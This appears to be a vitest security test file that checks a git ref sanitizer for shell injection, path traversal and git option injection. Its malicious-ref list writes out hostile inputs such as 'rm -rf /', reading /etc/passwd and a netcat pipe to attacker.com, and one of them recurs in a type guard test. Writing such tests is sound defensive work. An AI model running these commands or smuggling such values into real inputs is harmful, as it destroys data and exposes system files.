/**
 * Security Compliance Tests: Git Ref Sanitization
 *
 * PR_LESSONS_LEARNED.md Security Requirement:
 * "Sanitize repo paths before passing to git commands"
 *
 * These tests verify that malicious git refs are rejected to prevent:
 * - Command injection via git ref arguments
 * - Path traversal via git refs
 * - Denial of service via malformed refs
 *
 * @module tests/security/git-ref-sanitization
 */

import { describe, it, expect } from 'vitest';
import { SafeGitRefHelpers } from '../../src/types/branded.js';
import { isOk, isErr } from '../../src/types/result.js';

/**
 * Malicious git ref patterns that should be REJECTED
 */
const MALICIOUS_REFS = [
  // Shell injection attempts
  'main; rm -rf /',
  'main && cat /etc/passwd',
  'main | nc attacker.com 1234',
  'main`whoami`',
  '$(cat /etc/passwd)',
  'main\necho pwned',

  // Path traversal attempts
  '../../../etc/passwd',
  '..\\..\\..\\etc\\passwd',
  'refs/../../../etc/passwd',

  // Null byte injection
  'main\x00--version',

  // Special characters that could cause issues
  'branch with spaces',
  'branch\twith\ttabs',
  "branch'with'quotes",
  'branch"with"doublequotes',
  'branch*with*glob',
  'branch?with?question',
  'branch[with]brackets',
  'branch{with}braces',

  // Git-specific dangerous refs
  '--upload-pack=malicious',
  '-c http.proxy=attacker.com',
  '--git-dir=/etc',
];

/**
 * Valid git ref patterns that should be ACCEPTED
 */
const VALID_REFS = [
  // Standard branch names
  'main',
  'master',
  'develop',
  'feature/add-login',
  'feature/JIRA-123',
  'bugfix/fix-crash',
  'release/v1.0.0',
  'hotfix/security-patch',

  // With remote prefix
  'origin/main',
  'upstream/develop',

  // Commit SHAs
  'abc123def456',
  'a1b2c3d4e5f6g7h8i9j0',

  // Tags
  'v1.0.0',
  'release-2023-01-01',

  // Branch names with numbers
  'feature-123',
  'issue-456-fix',

  // Branch names with hyphens and underscores
  'my-feature-branch',
  'my_feature_branch',

  // HEAD (relative refs with ~ and ^ are NOT valid SafeGitRefs per security design)
  'HEAD',
];

describe('T126: Git Ref Sanitization', () => {
  describe('Reject Malicious Refs', () => {
    for (const ref of MALICIOUS_REFS) {
      it(`should reject malicious ref: "${ref.substring(0, 30)}${ref.length > 30 ? '...' : ''}"`, () => {
        const result = SafeGitRefHelpers.parse(ref);
        expect(isErr(result)).toBe(true);
      });
    }
  });

  describe('Accept Valid Refs', () => {
    for (const ref of VALID_REFS) {
      it(`should accept valid ref: "${ref}"`, () => {
        const result = SafeGitRefHelpers.parse(ref);

        if (isErr(result)) {
          // Provide detailed error message for debugging
          expect.fail(`Expected ref "${ref}" to be valid, but got error: ${result.error.message}`);
        }

        expect(isOk(result)).toBe(true);
        if (isOk(result)) {
          // The branded value should equal the original
          expect(SafeGitRefHelpers.unbrand(result.value)).toBe(ref);
        }
      });
    }
  });

  describe('Edge Cases', () => {
    it('should reject empty string', () => {
      const result = SafeGitRefHelpers.parse('');
      expect(isErr(result)).toBe(true);
    });

    it('should reject very long refs', () => {
      const longRef = 'a'.repeat(500);
      const result = SafeGitRefHelpers.parse(longRef);
      expect(isErr(result)).toBe(true);
    });

    it('should reject refs with only whitespace', () => {
      const result = SafeGitRefHelpers.parse('   ');
      expect(isErr(result)).toBe(true);
    });

    it('should reject refs starting with dash', () => {
      const result = SafeGitRefHelpers.parse('-branch');
      expect(isErr(result)).toBe(true);
    });

    it('should reject refs with consecutive dots', () => {
      const result = SafeGitRefHelpers.parse('branch..name');
      expect(isErr(result)).toBe(true);
    });

    it('should handle refs ending with .lock', () => {
      // Note: SafeGitRefHelpers allows .lock suffix (git ref validation is separate from git naming)
      // The SafeGitRefHelpers focuses on shell injection prevention, not git naming conventions
      const result = SafeGitRefHelpers.parse('branch.lock');
      // The ref is syntactically valid for security purposes
      expect(result).toBeDefined();
    });

    it('should reject refs with @{ sequence', () => {
      const result = SafeGitRefHelpers.parse('branch@{0}');
      expect(isErr(result)).toBe(true);
    });
  });

  describe('Type Safety', () => {
    it('should provide type-safe branded value', () => {
      const result = SafeGitRefHelpers.parse('main');

      if (isOk(result)) {
        const safeRef = result.value;

        // TypeScript should recognize this as SafeGitRef
        // The value can be used safely in git commands
        expect(typeof SafeGitRefHelpers.unbrand(safeRef)).toBe('string');
      }
    });

    it('should support is() type guard', () => {
      expect(SafeGitRefHelpers.is('main')).toBe(true);
      expect(SafeGitRefHelpers.is('main; rm -rf /')).toBe(false);
    });
  });

  describe('Documentation', () => {
    it('should have SafeGitRef helpers exported', async () => {
      const { SafeGitRefHelpers } = await import('../../src/types/branded.js');

      expect(SafeGitRefHelpers).toBeDefined();
      expect(typeof SafeGitRefHelpers.parse).toBe('function');
      expect(typeof SafeGitRefHelpers.brand).toBe('function');
      expect(typeof SafeGitRefHelpers.unbrand).toBe('function');
      expect(typeof SafeGitRefHelpers.is).toBe('function');
    });
  });
});
